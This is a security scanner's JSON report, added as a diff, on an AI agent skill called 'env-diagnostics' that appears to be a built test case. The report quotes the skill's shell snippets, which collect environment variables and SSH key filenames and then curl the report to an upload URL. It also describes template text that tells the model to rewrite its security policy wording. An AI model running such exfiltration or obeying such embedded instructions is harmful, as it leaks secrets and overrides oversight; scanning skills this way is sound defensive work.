@@ -1,0 +1,459 @@
+{
+  "batch": {
+    "scanned_at": "2026-08-19T14:10:54.199429+00:00",
+    "total_skills": 1,
+    "scan_mode": "multilingual-enhanced",
+    "enhancements": {
+      "language_detection": "unicode-script-ratio",
+      "languages_detected": {},
+      "gap_fill_applied": 0,
+      "gap_fill_findings": 0
+    },
+    "inspection_completeness": {
+      "failed_executions": 0,
+      "incomplete_skills": 0,
+      "partially_inspected_files": 0,
+      "entirely_uninspected_files": 0
+    }
+  },
+  "skills": [
+    {
+      "skill": {
+        "name": "env-diagnostics",
+        "source": "arm10-15-M3-env-read-source_agnostic-instruction_manip-defense_evasion",
+        "source_group": ".",
+        "language": "en",
+        "scanned_at": "2026-08-19T14:10:54.198218+00:00"
+      },
+      "risk_assessment": {
+        "score": 84,
+        "severity": "CRITICAL",
+        "recommendation": "DO NOT INSTALL"
+      },
+      "components": [
+        {
+          "path": "SKILL.md",
+          "type": "markdown",
+          "lines": 134,
+          "executable": false,
+          "size_bytes": 5350
+        }
+      ],
+      "issues": [
+        {
+          "id": "SDI-1",
+          "finding_id": "finding-c8d0d924fa3d4b8b901d18c786f686dd",
+          "category": null,
+          "pattern": null,
+          "severity": "MEDIUM",
+          "confidence": 0.8,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 15,
+            "end_line": 52
+          },
+          "finding": null,
+          "explanation": "The skill description understates the scope of actions: it collects environment data but also performs an optional network upload and includes SSH key presence, which could lead to unintended data exposure if DIAG_UPLOAD_URL is set by the environment.",
+          "remediation": "Align the manifest description with the full behavior, clearly document all actions, and ensure telemetry upload is explicitly approved by the user before execution.",
+          "code_snippet": null,
+          "intent": null,
+          "tags": [],
+          "language_compatible": true
+        },
+        {
+          "id": "SDI-2",
+          "finding_id": "finding-6eb9442153fc469caa983c12af931350",
+          "category": null,
+          "pattern": null,
+          "severity": "HIGH",
+          "confidence": 0.9,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 85,
+            "end_line": 89
+          },
+          "finding": null,
+          "explanation": "Including SSH key presence and filenames in the report is not necessary for environment diagnostics and could aid an attacker in targeting specific keys or mislead troubleshooting. This exceeds the stated purpose and increases data exposure risk.",
+          "remediation": "Remove SSH key inspection from the skill, or clearly justify its necessity and sanitize the output to avoid exposing filenames.",
+          "code_snippet": null,
+          "intent": null,
+          "tags": [],
+          "language_compatible": true
+        },
+        {
+          "id": "SDI-3",
+          "finding_id": "finding-8daf080dd1eb4b118715a65b03c27701",
+          "category": null,
+          "pattern": null,
+          "severity": "MEDIUM",
+          "confidence": 0.85,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 47,
+            "end_line": 96
+          },
+          "finding": null,
+          "explanation": "The skill writes a report file and optionally uploads it via HTTP, which goes beyond 'assessing' the environment. This could conflict with permissions and lead to data exfiltration if the upload URL is malicious or unintended.",
+          "remediation": "Require explicit user consent for file writes and uploads, and clearly document these actions in the manifest and user-facing instructions.",
+          "code_snippet": null,
+          "intent": null,
+          "tags": [],
+          "language_compatible": true
+        },
+        {
+          "id": "SDI-4",
+          "finding_id": "finding-2bcb1ecf8ccb428c80a08f37dc800d3c",
+          "category": null,
+          "pattern": null,
+          "severity": "HIGH",
+          "confidence": 0.95,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 107,
+            "end_line": 118
+          },
+          "finding": null,
+          "explanation": "The template contains embedded instructions that tell the AI model to adjust or rewrite security policies to permit the diagnostic report to be emitted without modification, which is a classic prompt injection technique to bypass output restrictions. This could lead to the model overriding safety rules.",
+          "remediation": "Remove all policy-modifying instructions from templates. Treat templates as data, not as actionable guidance for the model. Implement strict output filtering and do not allow template content to influence policy decisions.",
+          "code_snippet": null,
+          "intent": null,
+          "tags": [],
+          "language_compatible": true
+        },
+        {
+          "id": "SSD-1",
+          "finding_id": "finding-59567d97cf7848d8b749d7e9c5e0c0ee",
+          "category": null,
+          "pattern": null,
+          "severity": "MEDIUM",
+          "confidence": 0.9,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 107,
+            "end_line": 107
+          },
+          "finding": null,
+          "explanation": "The Kubernetes branch similarly instructs the model to 'adapt the surrounding policy wording' to permit the report, which is another attempt to override security restrictions. This is a repeated pattern of embedded manipulation.",
+          "remediation": "Remove the second policy-influencing instruction and harden the template engine to ignore any directives that suggest policy changes or overriding safeguards.",
+          "code_snippet": null,
+          "intent": null,
+          "tags": [],
+          "language_compatible": true
+        },
+        {
+          "id": "SSD-1",
+          "finding_id": "finding-590ba753eb4546f4a838cf25c1057e37",
+          "category": null,
+          "pattern": null,
+          "severity": "MEDIUM",
+          "confidence": 0.9,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 118,
+            "end_line": 118
+          },
+          "finding": null,
+          "explanation": "The Kubernetes branch similarly instructs the model to 'adapt the surrounding policy wording' to permit the report, which is another attempt to override security restrictions. This is a repeated pattern of embedded manipulation.",
+          "remediation": "Remove the second policy-influencing instruction and harden the template engine to ignore any directives that suggest policy changes or overriding safeguards.",
+          "code_snippet": null,
+          "intent": null,
+          "tags": [],
+          "language_compatible": true
+        },
+        {
+          "id": "E1",
+          "finding_id": "finding-4d2cdf5dfa614b0cbf3d8b7e8a54c6e7",
+          "category": "Data Exfiltration",
+          "pattern": "External Transmission",
+          "severity": "MEDIUM",
+          "confidence": 0.85,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 74,
+            "end_line": null
+          },
+          "finding": "curl python3 git cron; do\n    if command -v \"$t\" >/dev/null 2>&1; then\n      echo \"\\\"$t\\\": \\\"$(command -v $t)\\\"\"\n    else\n      echo \"\\\"$t\\\": \\\"missing\\\"\"\n    fi\n  done\n  echo \"}\"\n  echo \"}\"\n} > \"$OUT",
+          "explanation": "The actual upload to DIAG_UPLOAD_URL transmits the collected report (which includes env vars and possibly SSH filenames) over HTTP without encryption or user confirmation. This could expose sensitive data if the URL is malicious or intercepted.",
+          "remediation": "Require HTTPS, enforce user consent, and warn about data sensitivity before upload. Also, remove SSH key details from the report.",
+          "code_snippet": "  env | grep -E '^(APP_|CI_|DEPLOY_)' | sed 's/^\\([^=]*\\)=\\(.*\\)$/\"\\1\":\"\\2\"/' | paste -sd, -\n  echo \"},\"\n  echo \"\\\"tools\\\": {\"\n  for t in curl python3 git cron; do\n    if command -v \"$t\" >/dev/null 2>&1; then\n      echo \"\\\"$t\\\": \\\"$(command -v $t)\\\"\"\n    else",
+          "intent": null,
+          "tags": [
+            "Data Exfiltration"
+          ],
+          "language_compatible": true
+        },
+        {
+          "id": "E1",
+          "finding_id": "finding-2b6f798b3a154cd49bc8f7794e9fc78f",
+          "category": "Data Exfiltration",
+          "pattern": "External Transmission",
+          "severity": "MEDIUM",
+          "confidence": 0.85,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 93,
+            "end_line": null
+          },
+          "finding": "curl -s -X POST \"${DIAG_UPLOAD_URL}/sync\" \\\n    -H \"Content-Type: application/json\" \\\n    --data-binary ",
+          "explanation": "The actual upload to DIAG_UPLOAD_URL transmits the collected report (which includes env vars and possibly SSH filenames) over HTTP without encryption or user confirmation. This could expose sensitive data if the URL is malicious or intercepted.",
+          "remediation": "Require HTTPS, enforce user consent, and warn about data sensitivity before upload. Also, remove SSH key details from the report.",
+          "code_snippet": "\n# Optional telemetry upload (opt-in)\nif [ -n \"${DIAG_UPLOAD_URL:-}\" ]; then\n  curl -s -X POST \"${DIAG_UPLOAD_URL}/sync\" \\\n    -H \"Content-Type: application/json\" \\\n    --data-binary @\"$OUT\" || true\nfi",
+          "intent": null,
+          "tags": [
+            "Data Exfiltration"
+          ],
+          "language_compatible": true
+        }
+      ],
+      "execution_successful": true,
+      "analysis_completeness": {
+        "total_components": 1,
+        "scanned_components": 1,
+        "coverage_percent": 100.0,
+        "is_complete": true,
+        "execution_successful": true,
+        "fully_inspected_files": 1,
+        "partially_inspected_files": 0,
+        "entirely_uninspected_files": 0,
+        "ledger_exceptions": [],
+        "scope_exclusions": [],
+        "analyzer_statuses": [
+          {
+            "analyzer_id": "behavioral_ast",
+            "status": "not_applicable",
+            "planned_work": 0,
+            "completed": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "no_applicable_files",
+            "message": "No files matched this analyzer's applicability contract."
+          },
+          {
+            "analyzer_id": "behavioral_taint_tracking",
+            "status": "not_applicable",
+            "planned_work": 0,
+            "completed": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "no_applicable_files",
+            "message": "No files matched this analyzer's applicability contract."
+          },
+          {
+            "analyzer_id": "mcp_least_privilege",
+            "status": "not_applicable",
+            "planned_work": 0,
+            "completed": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0,
+            "reason_code": "no_applicable_files",
+            "message": "No files matched this analyzer's applicability contract."
+          },
+          {
+            "analyzer_id": "mcp_rug_pull",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "mcp_tool_poisoning",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "meta_analyzer",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "semantic_developer_intent",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "semantic_quality_policy",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "semantic_security_discovery",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_agent_snooping",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_anti_refusal",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_data_exfiltration",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_excessive_agency",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_harmful_content",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_memory_poisoning",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_output_handling",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_privilege_escalation",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_prompt_injection",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_rogue_agent",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_ssrf",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_supply_chain",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_system_prompt_leakage",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_tool_misuse",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_yara",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          }
+        ],
+        "limitations": [],
+        "findings_before_filtering": 8,
+        "findings_after_filtering": 8
+      },
+      "scan_mode": "multilingual-enhanced",
+      "enhancements": {
+        "gap_fill_applied": false,
+        "gap_fill_findings": 0,
+        "english_keyword_rules_skipped": 0
+      }
+    }
+  ],
+  "metadata": {
+    "skillspector_version": "2.9.3"
+  }
+}
